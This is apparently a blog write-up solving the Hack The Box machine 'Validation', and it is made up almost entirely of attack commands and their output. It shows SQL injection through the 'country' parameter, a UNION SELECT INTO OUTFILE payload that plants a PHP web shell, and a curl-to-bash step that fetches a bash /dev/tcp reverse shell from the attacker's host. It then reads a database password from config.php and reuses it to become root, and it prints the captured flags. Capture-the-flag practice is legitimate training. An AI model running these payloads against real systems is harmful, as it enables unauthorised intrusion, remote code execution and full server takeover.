---
title: "Validation from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Validation from HTB
`nmap`gave this
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
8080/tcp open  http    nginx
```
intercepting `join`process with `burpsuite + intercept`we get that after joining we receive cookie of our name in `md5`hash
I gave name `help` and got : 657f8b8da628ef83cf69101b6817150a
now in terminal
```bash
echo -n "help" | md5sum
657f8b8da628ef83cf69101b6817150a
```
same thing
So the theory is that with all that `users`joining there is an `sql database`
```bash
username=help&country=Brazil -- -
```
Returned no `error`so that means it is vulnerable to `sql injection`
`turn intercept on`and then send this payload
```
username=help&country=Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```
upload `cmd`
Didn't return error so that means it uploaded
```bash
/shell.php?cmd=id
admin admin' or 1=1 -- - helo uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Now get `reverse shell`
```bash
cat reverse.sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.7/1234 0>&1'

python3 -m http.server 8001

http://10.10.11.116/shell.php?cmd=curl 10.10.16.7:8001/reverse.sh|bash
```
***
User Flag is: 4a5379b8ce73567c327cc9686e4cf4c0
***
```bash
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```bash
There is an password which can be used for `root`
```
www-data@validation:/var/www/html$ su -
su -
Password: uhc-9qual-global-pw
id
uid=0(root) gid=0(root) groups=0(root)
```
***
Root Flag is: 94ba684e8cc1b2869c0b5a038b96044b
***
![](/assets/images/2024-08-24_03-00-19.png)
